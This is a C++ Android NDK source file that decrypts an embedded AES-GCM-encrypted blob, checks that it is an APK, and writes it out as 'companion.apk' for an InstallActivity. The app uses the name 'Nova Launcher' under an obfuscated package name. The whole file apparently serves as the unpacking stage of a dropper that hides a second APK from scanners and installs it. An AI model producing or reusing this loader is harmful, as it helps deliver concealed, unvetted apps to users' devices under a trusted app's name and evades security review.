// companion_decrypt.cpp
// ─────────────────────────────────────────────────────────────────────────────
// NDK C++ JNI decryptor for Nova Launcher.
//
// JNI export matches InstallActivity.kt exactly:
//   package : com.cristal.bristral.tristal.mistral
//   class   : InstallActivity
//   method  : decryptCompanion(ByteArray, String): Boolean
//
// Blob layout written by encrypt_companion.py:
//   [ 12 bytes IV ][ ciphertext ][ 16 bytes GCM tag ]
//
// AES_KEY_HEX is auto-patched by encrypt_companion.py at build time.
// ─────────────────────────────────────────────────────────────────────────────

#include <jni.h>
#include <openssl/evp.h>
#include <android/log.h>
#include <cerrno>
#include <cstdio>
#include <cstring>
#include <string>
#include <vector>

#define LOG_TAG "CompanionDecrypt"
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO,  LOG_TAG, __VA_ARGS__)

static constexpr int KEY_SIZE = 32;
static constexpr int IV_SIZE  = 12;
static constexpr int TAG_SIZE = 16;

// Auto-patched by encrypt_companion.py before NDK build
static const char *AES_KEY_HEX =
    "KEY_PLACEHOLDER_32_BYTES_HEX_64_CHARS";

static bool hexToBytes(const char *hex, unsigned char *out, int len) {
    for (int i = 0; i < len; i++) {
        unsigned int b = 0;
        if (sscanf(hex + i * 2, "%2x", &b) != 1) return false;
        out[i] = static_cast<unsigned char>(b);
    }
    return true;
}

static bool aesGcmDecrypt(const unsigned char *src, int srcLen,
                           const unsigned char *key,
                           std::vector<unsigned char> &plain) {
    if (srcLen < IV_SIZE + TAG_SIZE) {
        LOGE("Blob too small: %d bytes", srcLen);
        return false;
    }
    const unsigned char *iv         = src;
    int                  cipherLen  = srcLen - IV_SIZE - TAG_SIZE;
    const unsigned char *ciphertext = src + IV_SIZE;
    const unsigned char *tag        = src + IV_SIZE + cipherLen;

    plain.resize(static_cast<size_t>(cipherLen));
    bool ok = false;
    int outLen = 0;

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) { LOGE("EVP_CIPHER_CTX_new failed"); return false; }

    do {
        if (EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr) != 1) break;
        if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, IV_SIZE, nullptr) != 1) break;
        if (EVP_DecryptInit_ex(ctx, nullptr, nullptr, key, iv) != 1) break;

        int len1 = 0;
        if (EVP_DecryptUpdate(ctx, plain.data(), &len1, ciphertext, cipherLen) != 1) break;
        outLen = len1;

        if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, TAG_SIZE,
                                  const_cast<unsigned char *>(tag)) != 1) break;
        int len2 = 0;
        if (EVP_DecryptFinal_ex(ctx, plain.data() + len1, &len2) != 1) {
            LOGE("GCM tag verification FAILED — blob tampered or wrong key");
            break;
        }
        outLen += len2;
        ok = true;
    } while (false);

    EVP_CIPHER_CTX_free(ctx);
    if (ok) {
        plain.resize(static_cast<size_t>(outLen));
        LOGI("Decrypted %d bytes OK", outLen);
    }
    return ok;
}

static bool writeFile(const std::string &path,
                      const unsigned char *data, size_t len) {
    FILE *f = fopen(path.c_str(), "wb");
    if (!f) { LOGE("fopen(%s) failed: %s", path.c_str(), strerror(errno)); return false; }
    size_t written = fwrite(data, 1, len, f);
    fclose(f);
    if (written != len) { LOGE("Wrote %zu of %zu bytes", written, len); return false; }
    LOGI("Wrote %zu bytes to %s", written, path.c_str());
    return true;
}

// JNI export — must match InstallActivity.kt:
//   private external fun decryptCompanion(encryptedBlob: ByteArray, outPath: String): Boolean
extern "C"
JNIEXPORT jboolean JNICALL
Java_com_cristal_bristral_tristal_mistral_InstallActivity_decryptCompanion(
        JNIEnv *env, jobject /* thiz */,
        jbyteArray encryptedBlob, jstring outPath) {

    // Parse key
    unsigned char key[KEY_SIZE];
    if (!hexToBytes(AES_KEY_HEX, key, KEY_SIZE)) {
        LOGE("Failed to parse embedded key");
        return JNI_FALSE;
    }

    // Get blob bytes
    jsize blobLen = env->GetArrayLength(encryptedBlob);
    if (blobLen <= 0) { LOGE("Empty blob"); return JNI_FALSE; }

    jbyte *blobRaw = env->GetByteArrayElements(encryptedBlob, nullptr);
    if (!blobRaw) { LOGE("GetByteArrayElements returned null"); return JNI_FALSE; }

    // Decrypt
    std::vector<unsigned char> plain;
    bool ok = aesGcmDecrypt(
        reinterpret_cast<const unsigned char *>(blobRaw),
        static_cast<int>(blobLen), key, plain);

    env->ReleaseByteArrayElements(encryptedBlob, blobRaw, JNI_ABORT);

    if (!ok || plain.empty()) { LOGE("Decryption failed"); return JNI_FALSE; }

    // Verify PK magic
    if (plain.size() < 2 || plain[0] != 'P' || plain[1] != 'K') {
        LOGE("Decrypted data not an APK (no PK magic)");
        return JNI_FALSE;
    }

    // Get output path
    const char *pathC = env->GetStringUTFChars(outPath, nullptr);
    if (!pathC) { LOGE("GetStringUTFChars null"); return JNI_FALSE; }
    std::string pathStr(pathC);
    env->ReleaseStringUTFChars(outPath, pathC);

    // Write file
    if (!writeFile(pathStr, plain.data(), plain.size())) return JNI_FALSE;

    // Zero key
    memset(key, 0, KEY_SIZE);

    LOGI("SUCCESS — companion.apk written to %s", pathStr.c_str());
    return JNI_TRUE;
}
